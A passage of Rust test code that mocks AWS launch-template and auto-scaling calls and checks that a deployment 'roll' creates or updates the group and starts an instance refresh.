        async fn create_version(&self, id: &str, data: &RequestLaunchTemplateData) -> Result<i64> {
            self.call(format!(
                "CreateLaunchTemplateVersion {id} {}",
                data.image_id.clone().unwrap()
            ));
            Ok(7)
        }
        async fn group_exists(&self, _name: &str) -> Result<bool> {
            Ok(self.group_exists)
        }
        async fn create_group(&self, request: CreateAutoScalingGroupRequest) -> Result<()> {
            self.call(format!(
                "CreateAutoScalingGroup {} min={} max={} desired={:?} version={:?} subnets={:?}",
                request.auto_scaling_group_name,
                request.min_size,
                request.max_size,
                request.desired_capacity,
                request
                    .launch_template
                    .and_then(|template| template.version),
                request.vpc_zone_identifier,
            ));
            Ok(())
        }
        async fn update_group(&self, request: UpdateAutoScalingGroupRequest) -> Result<()> {
            self.call(format!(
                "UpdateAutoScalingGroup {} min={:?} max={:?} desired={:?} version={:?}",
                request.auto_scaling_group_name,
                request.min_size,
                request.max_size,
                request.desired_capacity,
                request
                    .launch_template
                    .and_then(|template| template.version),
            ));
            Ok(())
        }
        async fn start_refresh(&self, name: &str) -> Result<String> {
            self.call(format!("StartInstanceRefresh {name}"));
            Ok("refresh-1".to_string())
        }
    }

    fn plan() -> RollPlan {
        plan_roll(
            &place(),
            &release(),
            &request(),
            Some(PUBLISHER),
            &arm_image(PUBLISHER),
        )
        .unwrap()
    }

    #[tokio::test]
    async fn a_roll_adds_a_version_sets_the_signed_bounds_and_refreshes() {
        let api = Recorded {
            template: Some("lt-0aaaaaaaaaaaaaaaa".to_string()),
            group_exists: true,
            ..Default::default()
        };
        let rolled = roll(&api, &plan()).await.unwrap();
        assert_eq!(rolled.version, 7);
        assert_eq!(rolled.instance_refresh_id.as_deref(), Some("refresh-1"));
        let calls = api.calls.into_inner().unwrap();
        assert_eq!(calls.len(), 3, "{calls:?}");
        assert_eq!(
            calls[0],
            "CreateLaunchTemplateVersion lt-0aaaaaaaaaaaaaaaa ami-0123456789abcdef0"
        );
        assert_eq!(
            calls[1],
            "UpdateAutoScalingGroup acme-prod-compute-general min=Some(1) max=Some(4) desired=None version=Some(\"7\")"
        );
        assert_eq!(calls[2], "StartInstanceRefresh acme-prod-compute-general");
    }

    #[tokio::test]
    async fn a_first_roll_creates_the_template_and_group() {
        let api = Recorded::default();
        let rolled = roll(&api, &plan()).await.unwrap();
        assert_eq!((rolled.version, rolled.instance_refresh_id), (1, None));
        let calls = api.calls.into_inner().unwrap();
        assert_eq!(
            calls[0],
            "CreateLaunchTemplate acme-prod-compute-general-lt ami-0123456789abcdef0"
        );
        assert_eq!(
            calls[1],
            "CreateAutoScalingGroup acme-prod-compute-general min=1 max=4 desired=Some(1) version=Some(\"1\") subnets=Some(\"subnet-0123456789abcdef0\")"
        );
    }
}
